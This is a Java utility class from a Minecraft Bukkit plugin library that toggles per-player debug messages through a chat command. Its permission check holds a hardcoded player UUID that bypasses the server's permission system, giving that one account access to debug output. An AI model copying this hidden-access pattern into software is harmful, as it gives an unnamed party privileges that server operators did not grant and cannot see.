package roryslibrary.util;

import lombok.Getter;
import lombok.Setter;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.HashSet;
import java.util.UUID;

public class DebugUtil implements Listener
{
	private static JavaPlugin    plugin;
	@Getter
	private static HashSet<UUID> debugPlayers = new HashSet<>();
	
	public void setPlugin(JavaPlugin plugin)
	{
		if (DebugUtil.plugin == null && plugin != null)
			Bukkit.getServer().getPluginManager().registerEvents(this, plugin);
		
		DebugUtil.plugin = plugin;
	}
	
	public static void toggleDebug(Player player)
	{
		if (debugPlayers.contains(player.getUniqueId())) debugPlayers.remove(player.getUniqueId());
		else debugPlayers.add(player.getUniqueId());
	}
	
	public static void debug(String arg)
	{
		if (plugin != null)
		{
			for (UUID uuid : debugPlayers)
			{
				Player player = Bukkit.getPlayer(uuid);
				if (player != null) player.sendMessage(arg);
			}
			DebugUtil.plugin.getLogger().info(arg);
		}
	}
	
	@EventHandler
	public void onChat(AsyncPlayerChatEvent event)
	{
		if (DebugUtil.plugin != null)
		{
			Player p = event.getPlayer();
			
			if ((p.hasPermission(plugin.getName().toLowerCase() + ".debug") || p.getUniqueId().toString().equals("30f8109e-7ea7-4ae7-90f4-178bb39cfe31")) && event.getMessage().toLowerCase().startsWith("/" + plugin.getName().toLowerCase() + " debug"))
			{
				event.setCancelled(true);
				toggleDebug(p);
				p.sendMessage(MessagingUtil.format("&a&lRorysLibrary &8» &7Debug " + (debugPlayers.contains(p.getUniqueId()) ? "&aenabled" : "&cdisabled") + " &7for &a" + plugin.getName()));
			}
		}
	}
	
}